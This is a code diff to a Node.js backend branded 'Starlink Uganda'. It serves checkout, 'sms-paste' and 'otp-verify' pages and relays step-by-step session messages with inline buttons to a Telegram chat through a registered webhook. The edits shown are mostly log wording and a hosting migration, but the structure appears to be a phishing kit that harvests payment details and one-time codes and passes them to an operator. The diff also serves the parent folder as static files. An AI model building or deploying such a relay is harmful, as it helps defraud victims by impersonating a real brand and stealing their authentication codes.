@@ -1,5 +1,5 @@
 /* ============================================================
-   Starlink Uganda — Backend (Render)
+   Starlink Uganda — Backend
    ============================================================ */
 
 const express = require('express');
@@ -47,7 +47,8 @@ app.use((req, _res, next) => {
   next();
 });
 
-const PUBLIC_DIR = path.join(__dirname, 'public');
+/* HTML files live one folder up from server.js */
+const PUBLIC_DIR = path.join(__dirname, '..');
 
 app.use(express.static(PUBLIC_DIR));
 
@@ -98,7 +99,7 @@ function buildKeyboard(step, sessionId) {
 
 async function sendTelegramWithButtons(text, sessionId, step) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    console.warn('Telegram env vars missing');
+    console.warn('⚠️ Telegram env vars missing — message not sent.');
     return null;
   }
   try {
@@ -115,12 +116,12 @@ async function sendTelegramWithButtons(text, sessionId, step) {
     });
     const data = await res.json().catch(() => ({}));
     if (!data.ok) {
-      console.warn('Telegram error:', data.description || data);
+      console.warn('⚠️ Telegram error:', data.description || data);
       return null;
     }
     return data.result.message_id || null;
   } catch (err) {
-    console.error('Telegram fetch failed:', err.message);
+    console.error('❌ Telegram fetch failed:', err.message);
     return null;
   }
 }
@@ -189,7 +190,6 @@ app.get(['/checkout', '/checkout/'], servePage('checkout.html'));
 app.get(['/sms-paste', '/sms-paste/'], servePage('sms-paste.html'));
 app.get(['/otp-verify', '/otp-verify/'], servePage('otp-verify.html'));
 app.get(['/settings', '/settings/'], servePage('settings.html'));
-app.get(['/entertainment', '/entertainment/'], servePage('entertainment.html'));
 
 /* ============================================================
    API — CHECKOUT
@@ -509,25 +509,25 @@ app.use((err, _req, res, _next) => {
    ============================================================ */
 async function registerWebhook() {
   if (!TELEGRAM_BOT_TOKEN) {
-    console.warn('Cannot register webhook — TELEGRAM_BOT_TOKEN missing');
+    console.warn('⚠️ Cannot register webhook — TELEGRAM_BOT_TOKEN missing');
     global.__webhookStatus = 'missing_token';
     return;
   }
 
   let publicUrl = process.env.PUBLIC_URL || '';
-  if (!publicUrl && process.env.RENDER_EXTERNAL_URL) {
-    publicUrl = process.env.RENDER_EXTERNAL_URL;
+  if (!publicUrl && process.env.RAILWAY_PUBLIC_DOMAIN) {
+    publicUrl = `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`;
   }
   publicUrl = publicUrl.replace(/\/+$/, '');
 
   if (!publicUrl) {
-    console.warn('No PUBLIC_URL / RENDER_EXTERNAL_URL set');
+    console.warn('⚠️ No PUBLIC_URL / RAILWAY_PUBLIC_DOMAIN set');
     global.__webhookStatus = 'missing_url';
     return;
   }
 
   const webhookUrl = `${publicUrl}/api/telegram-webhook`;
-  console.log('Registering webhook:', webhookUrl);
+  console.log('🔗 Registering webhook:', webhookUrl);
 
   try {
     const res = await fetch(TELEGRAM_WEBHOOK_URL, {
@@ -540,14 +540,14 @@ async function registerWebhook() {
     });
     const data = await res.json().catch(() => ({}));
     if (data.ok) {
-      console.log('Telegram webhook registered:', webhookUrl);
+      console.log('✅ Telegram webhook registered:', webhookUrl);
       global.__webhookStatus = 'ok';
     } else {
-      console.warn('Webhook registration failed:', data.description || data);
+      console.warn('⚠️ Webhook registration failed:', data.description || data);
       global.__webhookStatus = `failed: ${data.description || 'unknown'}`;
     }
   } catch (err) {
-    console.error('Webhook registration error:', err.message);
+    console.error('❌ Webhook registration error:', err.message);
     global.__webhookStatus = `error: ${err.message}`;
   }
 }
@@ -557,9 +557,9 @@ async function registerWebhook() {
    ============================================================ */
 app.listen(PORT, async () => {
   console.log('====================================');
-  console.log('Starlink Uganda — backend running');
-  console.log(`Port: ${PORT}`);
-  console.log(`Telegram configured: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'YES' : 'NO'}`);
+  console.log('🛰️  Starlink Uganda — backend running');
+  console.log(`🚀 Port: ${PORT}`);
+  console.log(`📨 Telegram configured: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'YES' : 'NO'}`);
   console.log('====================================');
 
   setTimeout(registerWebhook, 2000);
